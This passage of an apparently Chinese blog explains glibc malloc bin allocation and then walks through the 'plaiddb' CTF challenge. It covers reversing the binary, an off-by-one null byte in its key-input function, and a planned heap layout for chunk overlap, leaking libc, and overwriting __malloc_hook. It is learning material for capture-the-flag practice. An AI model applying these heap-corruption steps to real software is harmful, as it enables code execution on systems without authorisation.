class="number">0</span>);</span><br><span class="line">		bin = bin_at(av, (block &lt;&lt; BINMAPSHIFT));</span><br><span class="line">		<span class="built_in">bit</span> = <span class="number">1</span>;</span><br><span class="line">        <span class="comment">//Idx2bit()宏将 idx 指定的位设置为 1，其它位清零， map 表示一个 block（unsigned int）值，如果 bit </span></span><br><span class="line">        <span class="comment">//大于 map，意味着 map 为 0，该 block 所对应的所有 bins 中都没有空闲 chunk，于是遍历 binmap 的下一</span></span><br><span class="line">        <span class="comment">//个 block，直到找到一个不为 0 的 block 或者遍历完所有的 block。退出循环遍历后，设置 bin 指向 block </span></span><br><span class="line">        <span class="comment">//的第一个 bit 对应的 bin，并将 bit 置为 1，表示该 block中 bit 1 对应的 bin，这个 bin 中如果有空闲 </span></span><br><span class="line">        <span class="comment">//chunk，该 chunk 的大小一定满足要求。</span></span><br><span class="line">	</span><br><span class="line">		<span class="keyword">while</span> ((<span class="built_in">bit</span> &amp; <span class="built_in">map</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">            bin = next_bin(bin);</span><br><span class="line">            <span class="built_in">bit</span> &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">            assert(<span class="built_in">bit</span> != <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//在一个 block 遍历对应的 bin，直到找到一个 bit 不为 0 退出遍历，则该 bit 对于的 bin</span></span><br><span class="line">        <span class="comment">//中有空闲 chunk 存在。</span></span><br><span class="line">        victim = last(bin);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后接下来就是一些分配流程</p>
+<ul>
+<li>如果 victim 与 bin 链表头指针相同，表示该 bin 中没有空闲 chunk， binmap 中的相应位设置不准确，将 binmap 的相应 bit 位清零， 获取当前 bin 下一个 bin，将 bit 移到下一个 bit位，即乘以 2。 </li>
+<li>当前 bin 中的最后一个 chunk 满足要求，获取该 chunk 的大小，计算切分出所需 chunk<br>后剩余部分的大小，然后将 victim 从 bin 的链表中取出。 <ul>
+<li>如果剩余部分的大小小于 MINSIZE，将整个 chunk 分配给应用层，设置 victim 的状态为inuse，如果当前分配区为非主分配区，设置 victim 的非主分配区标志位。 <strong>（这里就是我们0x320的chunk最终被返回的原因）</strong></li>
+<li>否则从 victim 中切分出所需的 chunk，剩余部分作为一个新的 chunk 加入到 unsorted bin 中。如果剩余部分 chunk 属于 small bins，将分配区的 last remainder chunk 设置为剩余部分构成的 chunk； 如果剩余部分 chunk 属于 large bins，将剩余部分 chunk 的 chunk size 链表指针设置为 NULL，因为 unsorted bin 中的 chunk 是不排序的，这两个指针无用，必须清零<ul>
+<li>接着设置 victim 和 remainder 的状态，由于 remainder 为空闲 chunk，所以需要设置该 chunk<br>的 foot。 </li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p>如果以上的分配都没有成功最后就会去寻找top_chunk</p>
+<p>这里找到一个ptmalloc简单点的总结：</p>
+<ol>
+<li>在fastbin中寻找有没有对应的chunk</li>
+<li>请求大小为small bin范围，在small bin中寻找有没有对应的chunk</li>
+<li>请求大小为large bin范围，仅调用malloc_consolidate合并fastbin</li>
+<li>在unsorted bin中寻找有没有合适的chunk</li>
+<li>在large bin中寻找有没有合适的chunk</li>
+<li>寻找较大的bin链中有没有合适的chunk</li>
+<li>寻找top_chunk</li>
+<li>top_chunk不够用，调用malloc_consolidate合并fastbin</li>
+<li>top_chunk不够用，系统调用再次申请内存</li>
+</ol>
+<p>原文链接：<a href="https://zhuanlan.zhihu.com/p/77316206" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/77316206</a></p>
+<h1 id="plaiddb"><a href="#plaiddb" class="headerlink" title="plaiddb"></a>plaiddb</h1><h2 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h2><p>打开IDA茫茫一片23333，然后自己先去把这个程序跑了一下，了解了一下大致的功能，看能不能先理出一点逆向思路来</p>
+<img src="/2020/02/10/how2heap-poison-null-byte-plaiddb/1581227038307.png" width="55%" height="55%">
+
+<p>暂时理解的大概意思就是：GET是获取一个row的内容，PUT是放入一个新的row，DUMP是打印rows的信息，DEL是删除一个row，EXIT就是退出了。</p>
+<p>接下来再来分析代码</p>
+<img src="/2020/02/10/how2heap-poison-null-byte-plaiddb/1581227277632.png" width="70%" height="70%">
+
+<p>因为这个函数里面的运算比较多，而且第一次进去也就是做了一些初始化，所以我就先慢慢分析下面的真正菜单</p>
+<hr>
+<p>Two hours later…..</p>
+<hr>
+<p>….逆锤子？结果还是要回到sub_CF0??….两百多行的函数配着循环和goto，快把我给逆疯了好嘛….(wtcl…)</p>
+<p>我先是逆出了一个结构体的样子（查了wp发现我这个结构体也还稍微有点问题，0x30处的应该是一个leaf or not的flag标识，我刚开始还以为它代表是否为根节点，不过bss段上存的那个变量应该是根节点指针）：</p>
+<p><img src="/2020/02/10/how2heap-poison-null-byte-plaiddb/1581237156090.png" alt="1581237156090"></p>
+<p>是的，我是在里面一次次调试尝试加上静态分析之后才发现这个数据库是用树形结构来实现的，限于数据结构的水平和逆向的代码量….我没有逆出来具体是哪种树，发现是树形结构之后为了不太浪费时间就放弃了逆向…转而查了WP（pwn这边果然是任重而道远啊）</p>
+<h3 id="PUT"><a href="#PUT" class="headerlink" title="PUT"></a>PUT</h3><img src="/2020/02/10/how2heap-poison-null-byte-plaiddb/1581257799309.png" width="70%" height="70%">
+
+<ul>
+<li>先申请一个0x40的chunk作为结点</li>
+<li>在Enter里面申请一个0x20的chunk存储这个结点的row key</li>
+<li>然后再申请一个我们可以控制大小的chunk来存储data<ul>
+<li>如果申请失败就free掉前两个chunk</li>
+</ul>
+</li>
+<li>data chunk申请成功，通过freadn来输入data，并尝试将这个结点加入red-black tree</li>
+<li>如果加入失败说明之前有相同的row key，树操作会返回相同row key结点的指针成功则返回0<ul>
+<li>失败：先free掉<strong>前面的row key chunk</strong>和<strong>已有结点的data chunk</strong>，接着更新<strong>已有结点的data size和data chunk</strong>指针，然后free掉<strong>前面的申请的结点chunk</strong></li>
+</ul>
+</li>
+</ul>
+<h3 id="DUMP"><a href="#DUMP" class="headerlink" title="DUMP"></a>DUMP</h3><img src="/2020/02/10/how2heap-poison-null-byte-plaiddb/1581258154196.png" width="80%" height="80%">
+
+<ul>
+<li>根据某种遍历方式，打印出所有结点的row key还有对应的data size（这里IDA打印函数的参数识别稍微有点问题）</li>
+</ul>
+<h3 id="GET"><a href="#GET" class="headerlink" title="GET"></a>GET</h3><img src="/2020/02/10/how2heap-poison-null-byte-plaiddb/1581258239453.png" width="80%" height="80%">
+
+<ul>
+<li>Enter时申请一个row key chunk，然后通过对比找到相应结点</li>
+<li>打印相应结点的data chunk内容</li>
+<li>free掉前面Enter的row key chunk</li>
+</ul>
+<h3 id="DEL"><a href="#DEL" class="headerlink" title="DEL"></a>DEL</h3><p>茫茫一片的树操作，不过关注点只需要放在chunk的操作上即可</p>
+<img src="/2020/02/10/how2heap-poison-null-byte-plaiddb/1581258527364.png" width="60%" height="60%">
+
+<p><img src="/2020/02/10/how2heap-poison-null-byte-plaiddb/1581258539173.png" alt="1581258539173"></p>
+<ul>
+<li>Enter一个row key chunk，然后查找对应的结点<ul>
+<li>找到了：free对应结点的row key chunk和data chunk然后free结点、free Enter的chunk</li>
+<li>没找到：直接退出，没有free Enter的chunk</li>
+</ul>
+</li>
+</ul>
+<h3 id="off-by-one"><a href="#off-by-one" class="headerlink" title="off_by_one"></a>off_by_one</h3><p>程序存在一个off_by_one,在<code>Enter</code>函数里面</p>
+<img src="/2020/02/10/how2heap-poison-null-byte-plaiddb/1581258784894.png" width="75%" height="75%">
+
+<p>当chunk_ptr_now - chunk_ptr == usable_size时，最后一步操作 <code>*chunk_ptr_now=0</code>会越界赋值0</p>
+<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>程序的流程是终于捋出来了，但是这个利用好想需要想一想，每次都是几个chunk一起操作（特别是PUT的时候），以前做的利用都比较单一，没有这么复杂。</p>
+<hr>
+<p>回想一下前面的<code>poison_null_byte.c</code></p>
+<ul>
+<li>free掉两个chunk中间的一个chunk（free之前先设置一个假的prev_size来通过malloc的检查，和之前那篇里面的fake size目的是不一样的，一个是为了通过free的检查一个是为了通过malloc的检查）（free之后第三个chunk的prev_inuse位就为0了）</li>
+<li>用第一个chunk的off_by_one来影响第二个chunk的size字段</li>
+<li>malloc两个小一点的chunk：b1&amp;b2</li>
+<li>free b1之后free第三个chunk，此时第三个chunk和b2 overlap</li>
+</ul>
+<hr>
+<p>那到这个题里面应该怎么利用呢emmm…..把断点下在第一次输入完命令DUMP之后(dump执行完不会影响heap)，调试看一下</p>
+<p><img src="/2020/02/10/how2heap-poison-null-byte-plaiddb/1581260525230.png" alt="1581260525230"></p>
+<p>此时堆中的chunks就是我们前面初始化的第一个结点还有对应的row key chunk和data chunk</p>
+<p>在这些chunk里面，结点chunk还有row key chunk都是指定大小的fastchunk，只有data可以为不同的chunk，然后存在漏洞的<code>Enter</code>函数是只被row key chunk调用的，所以off_by_one只发生在row key chunk生成时后面紧跟着的chunk</p>
+<h3 id="各处的malloc（初始化之后的）"><a href="#各处的malloc（初始化之后的）" class="headerlink" title="各处的malloc（初始化之后的）"></a>各处的malloc（初始化之后的）</h3><p>PUT中的chunk申请顺序：结点 -&gt; row key -&gt; data</p>
+<p>GET中只申请了一个row key</p>
+<p>DEL中也只有一个row key</p>
+<h3 id="各处的free"><a href="#各处的free" class="headerlink" title="各处的free"></a>各处的free</h3><p>PUT中：</p>
+<ul>
+<li>data申请失败会free掉PUT函数中申请的row key chunk和结点chunk</li>
+<li>输入的row key已存在时会free PUT函数中申请的row key chunk和已有结点的data chunk，还有前面的结点chunk</li>
+</ul>
+<p>GET中无论如何都会free用来查找的row key chunk</p>
+<p>DEL中：</p>
+<ul>
+<li>找到了：free对应结点的row key chunk、data chunk然后free结点、free Enter的chunk</li>
+<li>没找到：直接退出，没有free Enter的chunk</li>
+</ul>
+<hr>
+<h3 id="第一思路："><a href="#第一思路：" class="headerlink" title="第一思路："></a>第一思路：</h3><p>在初始化的基础上，再申请两个节点，此时堆中就会有以下结构</p>
+<table>
+<thead>
+<tr>
+<th>0x40</th>
+<th>0x20</th>
+<th>0x20</th>
+<th>0x40</th>
+<th>0x20</th>
+<th>0x???</th>
+<th>0x40</th>
+<th>0x20</th>
+<th>0x???</th>
+<th>0x??????</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>结点1</td>
+<td>row key1</td>
+<td>data1</td>
+<td>结点2</td>
+<td>row key2</td>
+<td>data2</td>
+<td>结点3</td>
+<td>row key3</td>
+<td>data3</td>
+<td>top_chunk</td>
+</tr>
+</tbody></table>
+<p>接着删除第二个结点</p>
+<table>
+<thead>
+<tr>
+<th>0x40</th>
+<th>0x20</th>
+<th>0x20</th>
+<th>0x40</th>
+<th>0x20</th>
+<th>0x???</th>
+<th>0x40</th>
+<th>0x20</th>
+<th>0x???</th>
+<th>0x20</th>
+<th>0x??????</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>结点1</td>
+<td>row key1</td>
+<td>data1</td>
+<td>结点2</td>
+<td>row key2</td>
+<td>data2</td>
+<td>结点3</td>
+<td>row key3</td>
+<td>data3</td>
+<td>row key4</td>
+<td>top_chunk</td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+<td>fastbin</td>
+<td>fastbin</td>
+<td>?bin</td>
+<td></td>
+<td></td>
+<td></td>
+<td>fastbin</td>
+<td></td>
+</tr>
+</tbody></table>
+<p>此时0x20的fastbin中是row key4-&gt;row key2</p>
+<p>然后通过DEL中没有free Enter chunk，申请两次，从而第二次可以在row key2处对data2造成off_by_one（既然能off_by_one，data2就肯定不是fastchunk了）</p>
+<p>但是还有一点，off_by_one发生之后，如果我们的目的是用例子的那种overlap，这是结点3是一个fastchunk，free的时候并不会向前合并，所以这个思路显然不行</p>
+<p>ps：然而当我写完后面的再回来看的时候，这里又是我立的一个flag，或者说我当时写到这里的时候还对构造不太熟悉，如果把两个data chunk构造在一起好像也不是不行（只要删掉前面一个结点，就会在fastbin中腾出位置来，再申请一个有大于之前data块的结点就可以了），主要是写后面的构造方法写着写着就忘了前面这个我想到的用DEL填充来off_by_one然后合并前面的chunk的方法，如果用这种方式来构造的话可以这样构造：</p>
+<table>
+<thead>
+<tr>
+<th>0x40</th>
+<th>0x20</th>
+<th>0x20</th>
+<th>0x40</th>
+<th>0x20</th>
+<th>0xd0</th>
+<th>0x40</th>
+<th>0x20</th>
+<th>0x70</th>
+<th>0x40</th>
+<th>0x20</th>
+<th>0x100</th>
+<th>0x40</th>
+<th>0x20</th>
+<th>0x40</th>
+<th></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>结点1</td>
+<td>rowkey1</td>
+<td>data1</td>
+<td>结点2</td>
+<td>rowkey2</td>
+<td>data2</td>
+<td>结点3</td>
+<td>rowkey3</td>
+<td>data3</td>
+<td></td>
+<td></td>
+<td>data5</td>
+<td>结点5</td>
+<td>rowkey5</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td>fastbin2</td>
+<td>fastbin1</td>
+<td></td>
+<td></td>
+<td></td>
+<td>fastbin2</td>
+<td></td>
+</tr>
+</tbody></table>
+<hr>
+<h3 id="第二思路："><a href="#第二思路：" class="headerlink" title="第二思路："></a>第二思路：</h3><table>
+<thead>
+<tr>
+<th>0x40</th>
+<th>0x20</th>
+<th>0x20</th>
+<th>0x40</th>
+<th>0x20</th>
+<th>0x???</th>
+<th>0x40</th>
+<th>0x20</th>
+<th>0x???</th>
+<th>0x??????</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>结点1</td>
+<td>row key1</td>
+<td>data1</td>
+<td>结点2</td>
+<td>row key2</td>
+<td>data2</td>
+<td>结点3</td>
+<td>row key3</td>
+<td>data3</td>
+<td>top_chunk</td>
+</tr>
+</tbody></table>
+<p>还是先产生这样的结构，不过此时row key3是和row key2一样的，主要是想让结点2中的data2改到data3去，然后就会变成这样</p>
+<table>
+<thead>
+<tr>
+<th>0x40</th>
+<th>0x20</th>
+<th>0x20</th>
+<th>0x40</th>
+<th>0x20</th>
+<th>0x???</th>
+<th>0x40</th>
+<th>0x20</th>
+<th>0x???</th>
+<th>0x??????</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>结点1</td>
+<td>row key1</td>
+<td>data1</td>
+<td>结点2</td>
+<td>row key2</td>
+<td>data2_old</td>
+<td>结点3</td>
+<td>row key3</td>
+<td>data2_n</td>
+<td>top_chunk</td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td>?bin</td>
+<td>fastbin</td>
+<td>fastbin</td>
+<td></td>
+<td></td>
+</tr>
+</tbody></table>
+<p>然后接着构造（data3要大过data2_old）</p>
+<table>
+<thead>
+<tr>
+<th align="left">0x40</th>
+<th>0x20</th>
+<th>0x20</th>
+<th>0x40</th>
+<th>0x20</th>
+<th>0x???</th>
+<th>0x40</th>
+<th>0x20</th>
+<th>0x?00</th>
+<th>0x???</th>
+<th>0x??????</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">结点1</td>
+<td>rowkey1</td>
+<td>data1</td>
+<td>结点2</td>
+<td>rowkey2</td>
+<td>data2_old</td>
+<td>结点3</td>
+<td>rowkey3</td>
+<td>data2_n</td>
+<td>data3</td>
+<td>top_chunk</td>
+</tr>
+<tr>
+<td align="left"></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td>?bin</td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+</tbody></table>
+<p>申请新的结点3，并在此时对data2_n构成off_by_one并写好prev_size</p>
+<p>这里之后我去参考了一些wp，发现大家都是用的结构体前面两个成员，row key ptr还有data size进行的leak，而且对应的指针是unsortedbin指针，因为unsortedbin指针的偏移会指向top_chunk，使用这种泄露方式可以同时泄露出libc_base和heap_base，再就是how2heap中这个off_by_one是用来malloc的时候不改变下个chunk的prev_size，但是这个题用off_by_one来free合并前面的chunk似乎更简单一点</p>
+<p>接着构造Double free，但是如果想要修改malloc hook之类的地方，我发现我不仅需要一个0x70的fastchunk（参考之前写的babyheap），还需要一个smallbin合并时用来unlink，所以得回去再重新加上（当然此时的chunk链结构就又发生了变化，保证data2_n被free时能合并前面的chunk，而且0x70chunk必须在这个smallbin之后）</p>
+<p>计算size并更改之后：</p>
+<table>
+<thead>
+<tr>
+<th>0x40</th>
+<th>0x20</th>
+<th>0x20</th>
+<th>0x40</th>
+<th>0x20</th>
+<th>0x90</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>结点1</td>
+<td>rowkey1</td>
+<td></td>
+<td></td>
+<td></td>
+<td>data1_n</td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+<td>fastbin</td>
+<td>fastbin</td>
+<td>fastbin</td>
+<td></td>
+</tr>
+</tbody></table>
+<p>然后一步步构造之前构造过的</p>
+<table>
+<thead>
+<tr>
+<th>0x40</th>
+<th>0x20</th>
+<th>0x20</th>
+<th>0x40</th>
+<th>0x20</th>
+<th>0x90</th>
+<th>0x40</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>结点1</td>
+<td>rowkey1</td>
+<td>rowkey2</td>
+<td>结点2</td>
+<td></td>
+<td>data1_n</td>
+<td>data2</td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td>fastbin</td>
+<td></td>
+<td></td>
+</tr>
+</tbody></table>
+<p>然后把data2后面造成一个结点为了0x90+0x40的chunk被分割之后直接DUMP leak</p>
+<table>
+<thead>
+<tr>
+<th>0x40</th>
+<th>0x20</th>
+<th>0x20</th>
+<th>0x40</th>
+<th>0x20</th>
+<th>0x90</th>
+<th>0x40</th>
+<th>0x40</th>
+<th>0x70</th>
+<th>…</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>结点1</td>
+<td>rowkey1</td>
+<td>rowkey2</td>
+<td>结点2</td>
+<td></td>
+<td>data1_n</td>
+<td>data2</td>
+<td></td>
+<td>data2_n</td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td>fastbin</td>
+<td></td>
+<td>fastbin</td>
+<td>fastbin</td>
+<td></td>
+<td></td>
+</tr>
+</tbody></table>
+<table>
+<thead>
+<tr>
+<th>0x40</th>
+<th>0x20</th>
+<th>0x20</th>
+<th>0x40</th>
+<th>0x20</th>
+<th>0x90</th>
+<th>0x40</th>
+<th>0x40</th>
+<th>0x70</th>
+<th></th>
+<th></th>
+<th></th>
+<th>…</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>结点1</td>
+<td>rowkey1</td>
+<td>rowkey2</td>
+<td>结点2</td>
+<td>rowkey3</td>
+<td>data1_n</td>
+<td>data3</td>
+<td>结点3</td>
+<td>data2_n</td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+</tbody></table>
+<p>开始构造off_by_one</p>
+<table>
+<thead>
+<tr>
+<th>0x40</th>
+<th>0x20</th>
+<th>0x20</th>
+<th>0x40</th>
+<th>0x20</th>
+<th>0x90</th>
+<th>0x40</th>
+<th>0x40</th>
+<th>0x70</th>
+<th>0x40</th>
+<th>0x20</th>
+<th>0x60</th>
+<th>…</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>结点1</td>
+<td>rowkey1</td>
+<td>rowkey2</td>
+<td>结点2</td>
+<td>rowkey3</td>
+<td>data1_n</td>
+<td>data3</td>
+<td>结点3</td>
+<td></td>
+<td></td>
+<td></td>
+<td>data2_nn</td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td>fastbin</td>
+<td>fastbin</td>
+<td>fastbin</td>
+<td></td>
+<td></td>
+</tr>
+</tbody></table>
+<table>
+<thead>
+<tr>
+<th>0x40</th>
+<th>0x20</th>
+<th>0x20</th>
+<th>0x40</th>
+<th>0x20</th>
+<th>0x90</th>
+<th>0x40</th>
+<th>0x40</th>
+<th>0x70</th>
+<th>0x40</th>
+<th>0x20</th>
+<th>0x60</th>
+<th>0x60</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>结点1</td>
+<td>rowkey1</td>
+<td>rowkey2</td>
+<td>结点2</td>
+<td>rowkey3</td>
+<td>data1_n</td>
+<td>data3</td>
+<td>结点3</td>
+<td></td>
+<td>结点4</td>
+<td>rowkey4</td>
+<td>data2_nn</td>
+<td>data4</td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td>fastbin</td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+</tbody></table>
+<table>
+<thead>
+<tr>
+<th>0x40</th>
+<th>0x20</th>
+<th>0x20</th>
+<th>0x40</th>
+<th>0x20</th>
+<th>0x90</th>
+<th>0x40</th>
+<th>0x40</th>
+<th>0x70</th>
+<th>0x40</th>
+<th>0x20</th>
+<th>0x60</th>
+<th>0x60</th>
+<th>0x40</th>
+<th>0x20</th>
+<th>0x110</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>结点1</td>
+<td>rowkey1</td>
+<td>rowkey2</td>
+<td>结点2</td>
+<td>rowkey3</td>
+<td>data1_n</td>
+<td>data3</td>
+<td>结点3</td>
+<td></td>
+<td>结点4</td>
+<td>rowkey4</td>
+<td>data2_nn</td>
+<td></td>
+<td></td>
+<td></td>
+<td>data4_n</td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td>fastbin</td>
+<td></td>
+<td></td>
+<td></td>
+<td>fastbin</td>
+<td>fastbin</td>
+<td>fastbin</td>
+<td></td>
+</tr>
+</tbody></table>
+<p>终于具备漏洞利用的条件了</p>
+<p>再添加一个结点5trigger off_by_one</p>
+<table>
+<thead>
+<tr>
+<th>0x40</th>
+<th>0x20</th>
+<th>0x20</th>
+<th>0x40</th>
+<th>0x20</th>
+<th>0x90</th>
+<th>0x40</th>
+<th>0x40</th>
+<th>0x70</th>
+<th>0x40</th>
+<th>0x20</th>
+<th>0x60</th>
+<th>0x60</th>
+<th>0x40</th>
+<th>0x20</th>
+<th>0x110</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>结点1</td>
+<td>rowkey1</td>
+<td>rowkey2</td>
+<td>结点2</td>
+<td>rowkey3</td>
+<td>data1_n</td>
+<td>data3</td>
+<td>结点3</td>
+<td></td>
+<td>结点4</td>
+<td>rowkey4</td>
+<td>data2_nn</td>
+<td>data5</td>
+<td>结点5</td>
+<td>rowkey5</td>
+<td>data4_n</td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td>fastbin</td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+</tbody></table>
+<p>删掉结点2、1、4(这里我调试之后回来2删了，否则后面树操作好像会出错，&gt;&gt;&gt;…&lt;&lt;&lt;中间的是unsorted chunk)</p>
+<table>
+<thead>
+<tr>
+<th>0x40</th>
+<th>0x20</th>
+<th>0x20</th>
+<th>0x40</th>
+<th>0x20</th>
+<th>0x90</th>
+<th>0x40</th>
+<th>0x40</th>
+<th>0x70</th>
+<th>0x40</th>
+<th>0x20</th>
+<th>0x60</th>
+<th>0x60</th>
+<th>0x40</th>
+<th>0x20</th>
+<th>0x110</th>
+<th>0x20</th>
+</tr>
+</thead>
+<tbody><tr>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td>rowkey3</td>
+<td></td>
+<td>data3</td>
+<td>结点3</td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td>data5</td>
+<td>结点5</td>
+<td>rowkey5</td>
+<td>data4_n</td>
+<td></td>
+</tr>
+<tr>
+<td>fastbin</td>
+<td>fastbin</td>
+<td>fastbin</td>
+<td>fastbin</td>
+<td></td>
+<td>&gt;&gt;&gt;</td>
+<td></td>
+<td></td>
+<td>fastbin</td>
+<td>fastbin</td>
+<td>fastbin</td>
+<td>fastbin</td>
+<td></td>
+<td></td>
+<td>&lt;&lt;&lt;</td>
+<td></td>
+<td>fastbin</td>
+</tr>
+</tbody></table>
+<p>然后申请一个data为0xD0的块a，但是由于我申请的大小太玄学了…top_chunk结尾刚好是\x00，打印会失败，所以我又更改了data5的大小，然后就可以成功leak了，此时的堆应该是这样（这里我把同大小的fastchunk在fastbin链表上的位置通过调试标出来了最先被malloc出去的数字最大，方便后面的制表）：</p>
+<table>
+<thead>
+<tr>
+<th>0x40</th>
+<th>0x20</th>
+<th>0x20</th>
+<th>0x40</th>
+<th>0x20</th>
+<th>0x90</th>
+<th>0x40</th>
+<th>0x40</th>
+<th>0x70</th>
+<th>0x40</th>
+<th>0x20</th>
+<th>0x60</th>
+<th>0x60</th>
+<th>0x40</th>
+<th>0x20</th>
+<th>0x110</th>
+<th>0x20</th>
+<th>0x110</th>
+</tr>
+</thead>
+<tbody><tr>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td>rowkey3</td>
+<td>(a data)</td>
+<td>data3(a data)</td>
+<td>结点3</td>
+<td></td>
+<td>结点a</td>
+<td></td>
+<td></td>
+<td></td>
+<td>结点5</td>
+<td>rowkey5</td>
+<td>data4_n</td>
+<td>rowkey a</td>
+<td>data5_n</td>
+</tr>
+<tr>
+<td>fastbin2</td>
+<td>fastbin2</td>
+<td>fastbin1</td>
+<td>fastbin1</td>
+<td></td>
+<td></td>
+<td></td>
+<td>&gt;&gt;&gt;</td>
+<td>fastbin1</td>
+<td></td>
+<td>fastbin3</td>
+<td>fastbin2</td>
+<td>fastbin1</td>
+<td></td>
+<td>&lt;&lt;&lt;</td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+</tbody></table>
+<p>leak之后我们再申请一个data size为0xB0的chunk b，就刚好把接下来0x70和0x40这个chunk重复利用了，而0x70这个chunk在fastbin里面，只要把他的fd改到__malloc_hook上方即可(具体位置见之前写的的babyheap)</p>
+<p>不过至于具体的data填充操作我调试了很久很久，稍不注意就会在各种地方出错，建议直接把内存全部打印出来然后照着上面的填进去，这样比较好</p>
+<table>
+<thead>
+<tr>
+<th>0x40</th>
+<th>0x20</th>
+<th>0x20</th>
+<th>0x40</th>
+<th>0x20</th>
+<th>0x90</th>
+<th>0x40</th>
+<th>0x40</th>
+<th>0x70</th>
+<th>0x40</th>
+<th>0x20</th>
+<th>0x60</th>
+<th>0x60</th>
+<th>0x40</th>
+<th>0x20</th>
+<th>0x110</th>
+<th>0x20</th>
+<th>0x110</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>结点b</td>
+<td></td>
+<td></td>
+<td></td>
+<td>rowkey3</td>
+<td>(a data)</td>
+<td>data3(a data)</td>
+<td>结点3(data b)</td>
+<td>(data b)</td>
+<td>结点a</td>
+<td>rowkeyb</td>
+<td></td>
+<td></td>
+<td>结点5</td>
+<td>rowkey5</td>
+<td>data4_n</td>
+<td>rowkey a</td>
+<td>data5_n</td>
+</tr>
+<tr>
+<td></td>
+<td>fastbin2</td>
+<td>fastbin1</td>
+<td>fastbin1</td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td>fastbin1</td>
+<td>&gt;&gt;&gt;</td>
+<td></td>
+<td>fastbin2</td>
+<td>fastbin1</td>
+<td></td>
+<td>&lt;&lt;&lt;</td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+</tbody></table>
+<p>然后我们在申请一个没有意义的c(data为0x70的fastchunk)，只是为了下一次能把__malloc_hook那块内存给malloc出来</p>
+<table>
+<thead>
+<tr>
+<th>0x40</th>
+<th>0x20</th>
+<th>0x20</th>
+<th>0x40</th>
+<th>0x20</th>
+<th>0x90</th>
+<th>0x40</th>
+<th>0x40</th>
+<th>0x70</th>
+<th>0x40</th>
+<th>0x20</th>
+<th>0x60</th>
+<th>0x60</th>
+<th>0x40</th>
+<th>0x20</th>
+<th>0x110</th>
+<th>0x20</th>
+<th>0x110</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>结点b</td>
+<td>rowkey c</td>
+<td></td>
+<td>结点c</td>
+<td>rowkey3</td>
+<td>(a data)</td>
+<td>data3(a data)</td>
+<td>结点3(data b)</td>
+<td>(data b)(data c)</td>
+<td>结点a</td>
+<td>rowkeyb</td>
+<td></td>
+<td></td>
+<td>结点5</td>
+<td>rowkey5</td>
+<td>data4_n</td>
+<td>rowkey a</td>
+<td>data5_n</td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+<td>fastbin1</td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td>&gt;&gt;&gt;</td>
+<td></td>
+<td>fastbin2</td>
+<td>fastbin1</td>
+<td></td>
+<td>&lt;&lt;&lt;</td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+</tbody></table>
+<p>这里好像再进行申请时会出错，我删结点5好像也删不掉(显示notfound，可能是因为a被unsortedbin指针破坏，然后树结构改变了的原因)，本来以为到这里就会嗝屁失败了，但是b被我成功删掉了(这可能就是玄学吧XD，希望以后不要有这种情况)</p>
+<p>然后malloc一个0x70的chunk修改__malloc_hook</p>
